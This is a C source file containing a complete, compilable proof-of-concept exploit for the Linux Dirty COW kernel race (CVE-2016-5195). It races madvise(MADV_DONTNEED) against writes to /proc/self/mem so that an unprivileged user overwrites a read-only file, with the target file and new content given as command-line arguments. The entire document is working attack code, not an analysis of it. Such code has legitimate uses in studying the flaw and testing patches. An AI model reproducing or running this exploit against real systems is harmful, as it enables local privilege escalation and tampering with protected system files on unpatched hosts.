/*
 * dirtyc0w.c - CVE-2016-5195 Exploit Demonstration
 *
 * This exploit maps a target read-only file using mmap(..., PROT_READ, MAP_PRIVATE, ...),
 * and creates two competing threads:
 *   1. Thread 1 calls madvise(..., MADV_DONTNEED) to tell the kernel to discard physical pages.
 *   2. Thread 2 writes to the mapped virtual address using write() via /proc/self/mem.
 *
 * This triggers a kernel-level race condition in copy-on-write page table handling,
 * letting a non-privileged user overwrite a read-only file.
 */

#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

/* Thread 1: Keep discarding the mapped pages */
void *madviseThread(void *arg) {
    char *str;
    str = (char *)arg;
    int i, c = 0;
    for(i = 0; i < 100000; i++) {
        /* Advise the kernel that this memory area is no longer needed */
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madviseThread completed %d advises\n", i);
    return 0;
}

/* Thread 2: Keep writing the payload to the mapped memory space via procfs */
void *procSelfMemThread(void *arg) {
    char *str;
    str = (char *)arg;
    
    /* Open the virtual file representing our own process's memory space */
    int f = open("/proc/self/mem", O_RDWR);
    if (f < 0) {
        perror("[-] Failed to open /proc/self/mem");
        return 0;
    }
    
    int i;
    for(i = 0; i < 100000; i++) {
        /* Seek to the mapped memory offset in our address space */
        lseek(f, (uintptr_t)map, SEEK_SET);
        /* Attempt to write the payload */
        write(f, str, strlen(str));
    }
    close(f);
    printf("procSelfMemThread completed %d writes\n", i);
    return 0;
}

int main(int argc, char *argv[]) {
    /* Set up threads and arguments */
    pthread_t pth1, pth2;
    
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_file> <new_content>\n", argv[0]);
        return 1;
    }
    
    name = argv[1];
    char *payload = argv[2];
    
    /* Open the target file read-only */
    f = open(name, O_RDONLY);
    if (f < 0) {
        perror("[-] Failed to open target file");
        return 1;
    }
    
    if (fstat(f, &st) < 0) {
        perror("[-] Failed to stat file");
        close(f);
        return 1;
    }
    
    /* Map the file read-only, but as a MAP_PRIVATE mapping */
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        perror("[-] Failed to mmap file");
        close(f);
        return 1;
    }
    
    printf("[*] File mapped at %p\n", map);
    printf("[*] Starting race threads to write: \"%s\"...\n", payload);
    
    /* Launch the competing race threads */
    pthread_create(&pth1, NULL, madviseThread, payload);
    pthread_create(&pth2, NULL, procSelfMemThread, payload);
    
    /* Wait for both threads to finish execution */
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    printf("[+] Race finished. Check file contents to see if attack succeeded!\n");
    
    munmap(map, st.st_size);
    close(f);
    return 0;
}
